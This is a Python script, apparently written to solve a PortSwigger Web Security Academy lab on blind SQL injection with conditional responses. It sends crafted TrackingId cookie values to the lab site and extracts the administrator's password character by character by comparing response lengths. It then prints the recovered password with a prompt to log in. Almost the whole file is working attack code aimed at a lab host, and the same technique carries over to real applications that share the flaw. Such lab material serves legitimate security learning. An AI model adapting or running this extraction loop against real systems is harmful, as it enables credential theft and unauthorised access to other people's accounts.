import os
import requests

burp0_url = "https://0aa700f804274379818f0d8700d90039.web-security-academy.net:443/filter?category=Pets"
burp0_cookies = {"TrackingId": "12sSFpfHuD092wMQ'+and+substr((SELECT+password+FROM+users+WHERE+username+%3d+'administrator'),1,1)!='a ", "session": "iANIf0jfihqyY9b31wS2Qdi3m1dCUAyD"}
burp0_headers = {"Sec-Ch-Ua": "\"Not_A Brand\";v=\"8\", \"Chromium\";v=\"120\"", "Sec-Ch-Ua-Mobile": "?0", "Sec-Ch-Ua-Platform": "\"Windows\"", "Upgrade-Insecure-Requests": "1", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.71 Safari/537.36", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7", "Sec-Fetch-Site": "same-origin", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-User": "?1", "Sec-Fetch-Dest": "document", "Referer": "https://0aa700f804274379818f0d8700d90039.web-security-academy.net/", "Accept-Encoding": "gzip, deflate, br", "Accept-Language": "en-US,en;q=0.9", "Priority": "u=0, i"}
# requests.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies)

# ######################  until here burp paste of request for python  ########################## #
# code by _amotz_ for:# lab: https://portswigger.net/web-security/sql-injection/blind/lab-conditional-responses

def clear():
    os.system('cls' if os.name=='nt' else 'clear')

char_list = "abcdefghijklmnopqrstuvwxyz1234567890"
password = ""
pass_index = 1
trackingId = burp0_cookies["TrackingId"]   
loaded_cookies = burp0_cookies
correct = len(requests.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies).content) 
password_found = False 

while not password_found:
    for i in char_list:
        loaded_cookies["TrackingId"] = f"{trackingId}'+AND+SUBSTR((SELECT+password+FROM+users+WHERE+username+%3d+'administrator'),+{pass_index},+1)+=+'{i}"
        response = requests.get(burp0_url, headers=burp0_headers, cookies=loaded_cookies)
        clear()
        print(f"""SQLI 'tell' is: {correct}\nletter being tested = {i}\nresponse length = {len(response.content)}\npartial password is:\n {password}""")
        if len(response.content) == correct: # when we find a match to one of the charecters
            password += i
            pass_index += 1
            break
        elif i == char_list[-1] and password != "": # checked all possible letters and the password string is not empty
            password_found = True
            clear()
            print(f"\npassword for username 'administrator' is:\n\n{password}\n\n\nnow go log in, you beautiful bastard!\n")
            break
        elif i == char_list[-1] and password == "": # checked all possible letters AND the password is still empty:
            print(f"failed. check charecter list:{char_list}")
            break


